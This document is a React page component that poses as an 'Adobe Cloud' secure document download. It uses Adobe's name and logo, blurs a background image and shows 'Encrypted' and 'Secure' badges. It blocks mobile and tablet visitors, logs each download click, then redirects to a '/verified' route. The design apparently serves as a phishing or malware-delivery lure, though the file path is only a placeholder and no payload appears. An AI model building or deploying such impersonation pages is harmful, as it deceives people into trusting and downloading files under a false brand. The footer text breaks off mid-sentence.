import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Download, FileText, Shield, Clock, Smartphone, XCircle } from 'lucide-react';

function NewPage() {
    const navigate = useNavigate();
    const [isLoading, setIsLoading] = useState(false);
    const [isMobile, setIsMobile] = useState(false);

    useEffect(() => {
        // Check if device is mobile or tablet
        const checkDevice = () => {
            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
            
            // Check for mobile/tablet via user agent
            const mobileRegex = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i;
            const isMobileDevice = mobileRegex.test(userAgent);
            
            // Check screen size as additional validation
            const isSmallScreen = window.innerWidth <= 1024;
            
            // Check for touch support (good indicator for tablets/mobile)
            const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            
            // If it's a mobile/tablet device OR (small screen AND touch supported)
            const isMobileOrTablet = isMobileDevice || (isSmallScreen && isTouchDevice);
            
            setIsMobile(isMobileOrTablet);
        };

        checkDevice();

        // Add resize listener to handle orientation changes
        const handleResize = () => {
            const isSmallScreen = window.innerWidth <= 1024;
            const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            setIsMobile(isSmallScreen && isTouchDevice);
        };

        window.addEventListener('resize', handleResize);

        return () => {
            window.removeEventListener('resize', handleResize);
        };
    }, []);

    const handleDownload = async () => {
        if (isMobile) return;

        setIsLoading(true);

        try {
            // Optional: Track download event
            await fetch("/api/track", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ action: "download" })
            });

            // Trigger download
            const link = document.createElement("a");
            link.href = "/path/to/your/file.pdf";
            link.download = "document.pdf";
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            // Navigate after download
            setTimeout(() => {
                navigate("/verified");
            }, 1500);

        } catch (error) {
            console.error("Download failed:", error);
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="fixed inset-0 flex items-center justify-center overflow-hidden p-4">
            {/* Background image */}
            <div 
                className="absolute inset-0 bg-cover bg-center bg-no-repeat"
                style={{ 
                    backgroundImage: 'url(/image/image.png)',
                    filter: 'blur(4px) brightness(0.5)'
                }}
            ></div>

            {/* Lighter overlay for readability */}
            <div className="absolute inset-0 bg-black/20"></div>

            {/* Main Card */}
            <div className="relative z-10 w-full max-w-md bg-black/40 backdrop-blur-md rounded-xl shadow-2xl overflow-hidden max-h-[95vh] border border-white/10">
                {/* Header */}
                <div className="bg-black/70 backdrop-blur-md px-4 sm:px-6 py-4 flex items-center gap-3 border-b border-white/10">
                    <img src="/adobelogo.png" alt="Adobe" className="h-8 w-auto" />
                    <div>
                        <h1 className="text-xl font-bold text-white">Adobe Cloud</h1>
                        <p className="text-gray-300 text-xs">Secure document access</p>
                    </div>
                </div>

                {/* Content */}
                <div className="px-4 sm:px-6 py-8">
                    <div className="text-center">
                        {/* Document Icon */}
                        <div className="w-20 h-20 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-blue-400/30">
                            <FileText className="w-10 h-10 text-blue-400" />
                        </div>

                        {!isMobile ? (
                            <>
                                <h2 className="text-2xl font-bold text-white mb-2">
                                    Document Ready
                                </h2>
                                <p className="text-gray-300 text-sm mb-6 max-w-sm mx-auto">
                                    Your secure document is ready for download. Click the button below to access it.
                                </p>

                                {/* Features */}
                                <div className="flex justify-center gap-6 mb-8 text-gray-300 text-xs">
                                    <div className="flex items-center gap-2">
                                        <Shield className="w-4 h-4 text-green-400" />
                                        <span>Encrypted</span>
                                    </div>
                                    <div className="flex items-center gap-2">
                                        <Clock className="w-4 h-4 text-blue-400" />
                                        <span>Valid</span>
                                    </div>
                                    <div className="flex items-center gap-2">
                                        <Shield className="w-4 h-4 text-green-400" />
                                        <span>Secure</span>
                                    </div>
                                </div>

                                {/* Download Button */}
                                <button
                                    onClick={handleDownload}
                                    disabled={isLoading}
                                    className="w-full text-white py-3 rounded-lg font-medium transition-all duration-200 hover:shadow-lg hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 flex items-center justify-center gap-2 bg-gradient-to-r from-blue-600 to-blue-500"
                                >
                                    {isLoading ? (
                                        <>
                                            <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                            </svg>
                                            Downloading...
                                        </>
                                    ) : (
                                        <>
                                            <Download className="w-5 h-5" />
                                            Download Document
                                        </>
                                    )}
                                </button>

                                <p className="text-xs text-gray-400 mt-4">
                                    By downloading, you agree to our terms of service.
                                    <br />
                                    File size: ~2.4 MB
                                </p>
                            </>
                        ) : (
                            // Mobile/Tablet view
                            <>
                                <div className="w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-red-400/30">
                                    <XCircle className="w-8 h-8 text-red-400" />
                                </div>
                                <h2 className="text-xl font-bold text-white mb-2">
                                    Desktop Only
                                </h2>
                                <p className="text-gray-300 text-sm mb-6 max-w-sm mx-auto">
                                    This document can only be downloaded on a desktop computer.
                                    <br />
                                    Please open this page on a desktop device to access the file.
                                </p>
                                <div className="flex items-center justify-center gap-2 text-gray-400 text-sm bg-white/5 rounded-lg p-3 border border-white/10">
                                    <Smartphone className="w-4 h-4" />
                                    <span>Mobile & Tablet devices are not supported</span>
                                </div>
                            </>
                        )}
                    </div>

                    {/* Footer */}
                    <div className="mt-6 pt-4 border-t border-white/10">
                        <p className="text-xs text-gray-400 text-center leading-relaxed">
                            Built upon Adobe Document Cloud.
                            <br />
                            Adobe Document Cloud features can
                        </p>
                    </div>
                </div>
            </div>

            {/* CSS Animation */}
            <style>{`
                @keyframes spin {
                    from { transform: rotate(0deg); }
                    to { transform: rotate(360deg); }
                }
                .animate-spin {
                    animation: spin 1s linear infinite;
                }
            `}</style>
        </div>
    );
}

export default NewPage;